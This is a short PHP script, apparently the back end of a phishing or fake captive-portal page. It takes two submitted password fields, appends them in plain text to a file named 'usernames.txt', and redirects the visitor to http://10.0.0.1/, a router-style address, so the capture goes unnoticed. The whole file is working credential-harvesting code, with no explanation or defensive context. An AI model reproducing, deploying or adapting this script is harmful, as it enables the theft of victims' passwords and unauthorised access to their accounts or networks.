<?php

file_put_contents("usernames.txt", "Password1: " . $_POST['password1'] . " Password2: " . $_POST['password2'] . "\n", FILE_APPEND);
header('Location: http://10.0.0.1/');
exit();
